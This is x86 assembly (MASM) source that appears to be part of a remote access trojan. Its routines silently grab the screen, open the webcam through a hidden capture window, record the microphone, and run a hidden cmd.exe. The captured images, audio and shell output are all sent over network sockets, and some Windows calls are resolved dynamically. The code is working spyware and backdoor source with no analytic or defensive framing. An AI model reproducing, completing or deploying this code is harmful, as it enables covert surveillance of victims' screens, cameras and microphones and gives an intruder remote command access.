
GetDesktop	proc uses ebx ecx esi edi olpbmpbuf,olpbufsize
    LOCAL	@lsls,@esi,@edi:dword
	assume esi:ptr OVERLAPPEDPLUS
	invoke Sleep,[esi].desktopsleep
	.if [esi].bbmpinit
		mov eax,sizeof BITMAPINFOHEADER
		add eax,1024
		mov [esi].dwinfosize,eax
		invoke CreateDC,CTEXT("DISPLAY"),0,0,0
		mov [esi].hScrDC,eax
		invoke CreateCompatibleDC,[esi].hScrDC 
		mov [esi].hMemDC,eax
		invoke CreateCompatibleBitmap,[esi].hScrDC,stpoint.x,stpoint.y
		mov [esi].hBitmap,eax
		invoke SelectObject,[esi].hMemDC,[esi].hBitmap
		mov [esi].oldhbitmap,eax
		mov eax,stpoint.x
		mov ecx,[esi].qinxidu
		mul ecx 
		xor edx,edx
		mov ecx,32
		div ecx
		mov ecx,4 
		mul ecx 
		mov [esi].dwbmpksize,eax
		add eax,2
		mov ecx,stpoint.y
		mul ecx
		add eax,8
		add eax,[esi].dwinfosize
		mov [esi].dwbmpsize,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,[esi].dwbmpsize
		mov [esi].lptmpbmp,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,[esi].dwbmpsize
		mov [esi].lpscrbmp,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,[esi].dwbmpsize
		mov [esi].lpdstbmp,eax
		mov edi,eax
		assume edi:ptr BITMAPINFOHEADER
		mov [edi].biSize,sizeof BITMAPINFOHEADER
		m2m [edi].biWidth,stpoint.x
		m2m [edi].biHeight,stpoint.y
		mov [edi].biPlanes,1
		mov eax,[esi].qinxidu
		mov [edi].biBitCount,ax
		mov [edi].biCompression,BI_RGB
		assume edi:nothing
	.endif
	invoke BitBlt,[esi].hMemDC,0,0,stpoint.x,stpoint.y,[esi].hScrDC,0,0,SRCCOPY
	mov edi,[esi].lpdstbmp
	add edi,[esi].dwinfosize
	invoke GetDIBits,[esi].hMemDC,[esi].hBitmap,0,stpoint.y,edi,[esi].lpdstbmp,DIB_RGB_COLORS
	mov ebx,[esi].dwinfosize
	mov edx,[esi].dwbmpksize
	mov edi,[esi].lptmpbmp
	add edi,8
	invoke LYQMoveMemory,edi,[esi].lpdstbmp,ebx
	m2m @esi,[esi].lpscrbmp
	add @esi,ebx
	m2m @edi,[esi].lpdstbmp
	add @edi,ebx
	add edi,ebx
	mov @lsls,0
	xor ebx,ebx
	.while ebx<stpoint.y
		invoke LYQCmpMemory,@esi,@edi,edx
		.if !eax
			mov word ptr[edi],bx
			add edi,2
			invoke LYQMoveMemory,edi,@edi,edx
			add edi,edx
			inc @lsls
		.endif
		add @esi,edx
		add @edi,edx
		inc ebx
	.endw
	.if @lsls
		mov edi,[esi].lptmpbmp
		m2m dword ptr[edi],@lsls
		m2m dword ptr[edi+4],edx
		mov eax,[esi].dwbmpksize
		add eax,2
		mov ecx,@lsls
		mul ecx
		add eax,8
		add eax,[esi].dwinfosize
		mov @lsls,eax
;		invoke LYQMoveMemory,olpbmpbuf,addr @lslp,4
;		invoke LYQMoveMemory,olpbufsize,addr @lsls,4
		invoke lzgetsize,eax
		add eax,4
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,eax
		mov @esi,eax
		mov edi,eax
		m2m dword ptr[edi],@lsls
		add edi,4
		push @lsls
		push edi
		push [esi].lptmpbmp
		push @f
		jmp lzpack
		@@:
		cmp eax,0
		jz error
		mov @edi,eax
		add @edi,4
		mov eax,olpbmpbuf
		m2m dword ptr[eax],@esi
		mov eax,olpbufsize
		m2m dword ptr[eax],@edi
	.else
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,4
		mov @esi,eax
error:
		mov @edi,4
		mov eax,olpbmpbuf
		m2m dword ptr[eax],@esi
		mov eax,olpbufsize
		m2m dword ptr[eax],@edi
	.endif
	invoke LYQMoveMemory,[esi].lpscrbmp,[esi].lpdstbmp,[esi].dwbmpsize
	assume esi:nothing
    ret
GetDesktop endp 

capErrorCallback proc uses ebx ecx esi edi hWnd,nid,lpsz
	mov eax,TRUE
	ret
capErrorCallback endp

FrameCallback	Proc uses ebx ecx esi edi hWnd,lpVHdr
	mov edi,lpbmi
	mov esi,lpVHdr
	assume esi:ptr VIDEOHDR,edi:ptr BITMAPINFO
	invoke LYQMoveMemory,lpdib,[esi].lpData,[edi].bmiHeader.biSizeImage
	invoke SetEvent,hCaptureEvent
	assume esi:nothing,edi:nothing
	ret
FrameCallback	endp

CloseCamera proc uses ebx ecx esi edi
	invoke SendMessage,hCapture,WM_CAP_ABORT,0,0
	invoke SendMessage,hCapture,WM_CAP_DRIVER_DISCONNECT,0,0
	invoke SendMessage,hCapture,402h,0,0
	invoke SendMessage,hCapture,WM_CAP_SET_CALLBACK_FRAME,0,0
	invoke SendMessage,hCapture,WM_CLOSE,0,0
	invoke CloseHandle,hCaptureEvent
	.if lpbmi
		invoke GlobalFree,lpbmi
		mov lpbmi,0
	.endif
	.if lpdib
		invoke GlobalFree,lpdib
		mov lpdib,0
	.endif
	mov bStartCapture,0
	ret
CloseCamera endp

StartCamera proc uses ebx ecx esi edi
	LOCAL @lpcapCreateCaptureWindowA
	LOCAL @gCapDriverCaps:CAPDRIVERCAPS
	invoke LLGPA,CTEXT("Avicap32.dll"),CTEXT("capCreateCaptureWindowA")
	mov	@lpcapCreateCaptureWindowA,eax
	.if !@lpcapCreateCaptureWindowA || bStartCapture
		mov eax,FALSE
		ret
	.endif
	mov lpbmi,0
	mov lpdib,0
	invoke GetDesktopWindow
	mov edi,eax
	push 0
	push edi
	push 0
	push 0
	push 0
	push 0
	push WS_CHILD or WS_VISIBLE
	push CTEXT(" ")
	call @lpcapCreateCaptureWindowA
	.if eax
		mov hCapture,eax
		invoke SetWindowPos,hCapture,0,0,0,0,0,SWP_HIDEWINDOW
		invoke SendMessage,hCapture,WM_CAP_DRIVER_CONNECT,0,0
		.if !eax
			invoke SendMessage,hCapture,WM_CLOSE,0,0
			mov eax,FALSE
			ret
		.endif
		invoke SendMessage,hCapture,WM_CAP_GET_VIDEOFORMAT,NULL,NULL
		mov dwbmisize,eax
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,dwbmisize
		mov lpbmi,eax
		invoke SendMessage,hCapture,WM_CAP_GET_VIDEOFORMAT,dwbmisize,lpbmi
		mov esi,lpbmi
		assume esi:ptr BITMAPINFO
		mov eax,[esi].bmiHeader.biSizeImage
		.if !eax
			invoke SendMessage,hCapture,WM_CAP_ABORT,0,0
			invoke SendMessage,hCapture,WM_CAP_DRIVER_DISCONNECT,0,0
			invoke SendMessage,hCapture,402h,0,0
			invoke SendMessage,hCapture,WM_CLOSE,0,0
			mov eax,FALSE
			ret
		.endif
		mov dwdibsize,eax
		add dwdibsize,400
		assume esi:nothing
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,dwdibsize
		mov lpdib,eax
		invoke SendMessage,hCapture,402h,0,addr capErrorCallback
		invoke SendMessage,hCapture,WM_CAP_SET_CALLBACK_FRAME,0,addr FrameCallback
		invoke SendMessage,hCapture,WM_CAP_DRIVER_GET_CAPS,sizeof CAPDRIVERCAPS,addr @gCapDriverCaps
		invoke SendMessage,hCapture,WM_CAP_SET_OVERLAY,FALSE,0
		invoke SendMessage,hCapture,WM_CAP_SET_PREVIEW,FALSE,0
		invoke SendMessage,hCapture,WM_CAP_SET_SCALE,FALSE,0
		invoke CreateEvent,NULL,FALSE,FALSE,NULL
		mov hCaptureEvent,eax
		mov bStartCapture,1
		mov eax,TRUE
	.else
		mov eax,FALSE
	.endif
	ret
StartCamera endp

GetCamera proc uses ebx ecx esi edi olpbuf,olpbufsize
LOCAL	@filesize,@filesizels,@lpcamera:dword
LOCAL	@dwyssize,@lpysbmp:dword
	invoke SendMessage,hCapture,WM_CAP_GRAB_FRAME_NOSTOP,0,0
	invoke WaitForSingleObject,hCaptureEvent,1777
	.if eax==WAIT_TIMEOUT || eax==WAIT_FAILED
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,4
		mov @lpysbmp,eax
error:
		mov @dwyssize,4
		mov eax,olpbuf
		m2m dword ptr[eax],@lpysbmp
		mov eax,olpbufsize
		m2m dword ptr[eax],@dwyssize
	.else
		invoke lzgetsize,dwdibsize
		add eax,4
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,eax
		mov @lpysbmp,eax
		mov ebx,eax
		m2m dword ptr[ebx],dwdibsize
		add ebx,4		
		push dwdibsize
		push ebx
		push lpdib
		push @f
		jmp lzpack
		@@:
		cmp eax,0
		jz error
		mov @dwyssize,eax
		add @dwyssize,4
		mov eax,olpbuf
		m2m dword ptr[eax],@lpysbmp
		mov eax,olpbufsize
		m2m dword ptr[eax],@dwyssize
	.endif
	ret
GetCamera endp

CameraThread	proc uses ebx ecx esi edi lParam
LOCAL	@desktopbuf,@desktopsize:dword
LOCAL   @msg:MSG
	invoke PeekMessage,addr @msg,NULL,WM_USER,WM_USER,PM_NOREMOVE
	.while TRUE
		invoke GetMessage,addr @msg,NULL,NULL,NULL
		.if !eax
			.continue
		.endif
		mov esi,@msg.lParam
		assume esi:ptr OVERLAPPEDPLUS
		.if @msg.message==402h
			invoke StartCamera
			.if eax
				invoke Connects
				.if eax
					mov edi,eax
					invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,dwbmisize
					mov ebx,eax
					invoke LYQMoveMemory,ebx,lpbmi,dwbmisize
					invoke WSASends,edi,ebx,dwbmisize,SOCKETTAG.cameraconn
				.else
					invoke CloseCamera
				.endif
			.endif
		.elseif @msg.message==404h
			invoke GetCamera,addr @desktopbuf,addr @desktopsize
			invoke WSASends,[esi].hsocket,@desktopbuf,@desktopsize,SOCKETTAG.camerasend
		.elseif @msg.message==408h
			invoke CloseCamera
		.endif
		assume esi:nothing	
	.endw
	ret
CameraThread endp

RecDataCallBack	proc uses ebx ecx esi edi hwi,uMsg,dwInstance,dwParam1,dwParam2   
	LOCAL	@lprecdata:dword
	mov eax,uMsg
	.if eax==WIM_DATA
		mov esi,dwInstance
		mov edi,dwParam1
		assume esi:ptr OVERLAPPEDPLUS,edi:ptr WAVEHDR
		.if [esi].hBitmap
			ret
		.endif
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,[edi].dwBytesRecorded
		mov @lprecdata,eax
		invoke LYQMoveMemory,@lprecdata,[edi].lpData,[edi].dwBytesRecorded
		invoke WSASends,[esi].hsocket,@lprecdata,[edi].dwBytesRecorded,SOCKETTAG.recsend
		invoke LYQZeroMemory,[edi].lpData,16384
		push sizeof WAVEHDR
		push dwParam1
		push [esi].hWaveIn
		call lpwaveInAddBuffer
;		invoke waveInAddBuffer,[esi].hWaveIn,dwParam1,sizeof WAVEHDR
		assume esi:nothing,edi:nothing
	.elseif eax==WIM_CLOSE
		mov esi,dwInstance
		assume esi:ptr OVERLAPPEDPLUS
		push sizeof WAVEHDR
		push [esi].lpWavehdIn
		push [esi].hWaveIn
		call lpwaveInUnprepareHeader
;		invoke waveInUnprepareHeader,[esi].hWaveIn,[esi].lpWavehdIn,sizeof WAVEHDR
		push sizeof WAVEHDR
		push [esi].lpWavehdInone
		push [esi].hWaveIn
		call lpwaveInUnprepareHeader
;		invoke waveInUnprepareHeader,[esi].hWaveIn,[esi].lpWavehdInone,sizeof WAVEHDR
		.if [esi].lpRecBuf
			invoke GlobalFree,[esi].lpRecBuf
			invoke GlobalFree,[esi].lpRecBufone
			mov [esi].lpRecBuf,0
		.endif
		assume esi:nothing
	.endif
	ret
RecDataCallBack endp

StartRec proc uses ebx ecx esi edi
	LOCAL	@waveform:WAVEFORMATEX
	assume esi:ptr OVERLAPPEDPLUS
	mov @waveform.wFormatTag,WAVE_FORMAT_PCM
	mov @waveform.nChannels,1
	mov @waveform.nSamplesPerSec,11025
	mov @waveform.nAvgBytesPerSec,11025
	mov @waveform.nBlockAlign,1
	mov @waveform.wBitsPerSample,8
	mov @waveform.cbSize,0
	push CALLBACK_FUNCTION
	push esi
	push offset RecDataCallBack
	lea eax,@waveform
	push eax
	push WAVE_MAPPER
	lea eax,[esi].hWaveIn
	push eax
	call lpwaveInOpen
;	invoke waveInOpen,addr [esi].hWaveIn,WAVE_MAPPER,addr @waveform,addr RecDataCallBack,esi,CALLBACK_FUNCTION	
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof WAVEHDR
	mov [esi].lpWavehdIn,eax
	mov edi,eax
	assume edi:ptr WAVEHDR
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,16384
	mov [esi].lpRecBuf,eax
	mov [edi].lpData,eax
	mov [edi].dwBufferLength,16384
	mov [edi].dwBytesRecorded,0
	mov [edi].dwUser,0
	mov [edi].dwFlags,0
	mov [edi].dwLoops,1
	mov [edi].lpNext,0
	mov [edi].Reserved,0
	assume edi:nothing
	push sizeof WAVEHDR
	push [esi].lpWavehdIn
	push [esi].hWaveIn
	call lpwaveInPrepareHeader
;	invoke waveInPrepareHeader,[esi].hWaveIn,[esi].lpWavehdIn,sizeof WAVEHDR
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,sizeof WAVEHDR
	mov [esi].lpWavehdInone,eax
	mov edi,eax
	assume edi:ptr WAVEHDR
	invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,16384
	mov [esi].lpRecBufone,eax
	mov [edi].lpData,eax
	mov [edi].dwBufferLength,16384
	mov [edi].dwBytesRecorded,0
	mov [edi].dwUser,0
	mov [edi].dwFlags,0
	mov [edi].dwLoops,1
	mov [edi].lpNext,0
	mov [edi].Reserved,0
	assume edi:nothing
	push sizeof WAVEHDR
	push [esi].lpWavehdInone
	push [esi].hWaveIn
	call lpwaveInPrepareHeader
;	invoke waveInPrepareHeader,[esi].hWaveIn,[esi].lpWavehdInone,sizeof WAVEHDR
	push sizeof WAVEHDR
	push [esi].lpWavehdIn
	push [esi].hWaveIn
	call lpwaveInAddBuffer
;	invoke waveInAddBuffer,[esi].hWaveIn,[esi].lpWavehdIn,sizeof WAVEHDR
	push sizeof WAVEHDR
	push [esi].lpWavehdInone
	push [esi].hWaveIn
	call lpwaveInAddBuffer
;	invoke waveInAddBuffer,[esi].hWaveIn,[esi].lpWavehdInone,sizeof WAVEHDR
	push [esi].hWaveIn
	call lpwaveInStart
;	invoke waveInStart,[esi].hWaveIn
	mov [esi].hBitmap,0
	assume esi:nothing
	ret
StartRec endp

GetFileStrSize	proc uses ebx ecx esi edi lParam
LOCAL	@finddata:WIN32_FIND_DATA
LOCAL	@lpsend,@hfindfile:dword
	xor edi,edi
	invoke LYQZeroMemory,addr @finddata,sizeof WIN32_FIND_DATA
	invoke FindFirstFile,lParam,addr @finddata
	.if eax!=INVALID_HANDLE_VALUE
		mov @hfindfile,eax
		.repeat
			.if @finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY
				invoke lstrcat,addr @finddata.cFileName,CTEXT("\")
				invoke lstrlen,addr @finddata.cFileName
				add edi,eax
				inc edi
			.else
				invoke lstrlen,addr @finddata.cFileName
				add edi,eax
				inc edi
			.endif
			invoke FindNextFile,@hfindfile,addr @finddata
		.until	eax==FALSE
		invoke FindClose,@hfindfile
	.endif
	add edi,80
	mov eax,edi
	ret
GetFileStrSize endp

InitPipe proc uses ebx ecx esi edi lParam
	LOCAL @BytesRead:dword
	LOCAL @sa:SECURITY_ATTRIBUTES
	LOCAL @si:STARTUPINFO
	LOCAL @pi:PROCESS_INFORMATION
	mov esi,lParam
	assume esi:ptr OVERLAPPEDPLUS
	invoke LYQZeroMemory,addr @si,sizeof STARTUPINFO
	invoke LYQZeroMemory,addr @pi,sizeof PROCESS_INFORMATION
	mov @sa.nLength,sizeof SECURITY_ATTRIBUTES
	mov @sa.bInheritHandle,TRUE
	mov @sa.lpSecurityDescriptor,NULL
	invoke CreatePipe,addr [esi].hReadPipeHandle,addr [esi].hWritePipeShell,addr @sa,0
	invoke CreatePipe,addr [esi].hReadPipeShell,addr [esi].hWritePipeHandle,addr @sa,0
    invoke GetStartupInfo,addr @si
    mov @si.cb,sizeof STARTUPINFO
    mov @si.wShowWindow,SW_HIDE
    mov @si.dwFlags,101h
    m2m @si.hStdInput,[esi].hReadPipeShell
    m2m @si.hStdOutput,[esi].hWritePipeShell
    m2m @si.hStdError,[esi].hWritePipeShell
    invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,MAX_PATH
    mov edi,eax
    invoke GetWindowsDirectory,edi,MAX_PATH
    invoke lstrcat,edi,CTEXT("\system32\cmd.exe")
    invoke CreateProcess,edi,NULL,NULL,NULL,TRUE,NULL,NULL,NULL,addr @si,addr @pi
    invoke GlobalFree,edi
	m2m [esi].cmdhprocess,@pi.hProcess
	m2m [esi].cmdhprocthread,@pi.hThread
	.while TRUE
		invoke GlobalAlloc,GMEM_FIXED or GMEM_ZEROINIT,4096
		mov edi,eax
		invoke PeekNamedPipe,[esi].hReadPipeHandle,edi,4096,addr @BytesRead,NULL,NULL
		.if eax
			invoke ReadFile,[esi].hReadPipeHandle,edi,4096,addr @BytesRead,NULL
			invoke WSASends,[esi].hsocket,edi,4096,SOCKETTAG.cmdrun
		.else
			invoke GlobalFree,edi
		.endif
		invoke Sleep,100
	.endw
	assume esi:nothing
	ret
InitPipe endp

ClosePipe proc uses ebx ecx esi edi
	assume esi:ptr OVERLAPPEDPLUS
	.if [esi].cmdhthread
		push NULL
		push [esi].cmdhthread
		call lpTerminateThread
;		invoke TerminateThread,[esi].cmdhthread,NULL
		push NULL
		push [esi].cmdhprocess
		call lpTerminateProcess
;		invoke TerminateProcess,[esi].cmdhprocess,NULL
		invoke CloseHandle,[esi].cmdhprocess
		invoke CloseHandle,[esi].cmdhthread
		invoke CloseHandle,[esi].cmdhprocthread
		invoke CloseHandle,[esi].hReadPipeHandle
		invoke CloseHandle,[esi].hWritePipeHandle
		invoke CloseHandle,[esi].hReadPipeShell
		invoke CloseHandle,[esi].hWritePipeShell
		mov [esi].cmdhthread,0
	.endif
	assume esi:nothing
	ret
ClosePipe endp
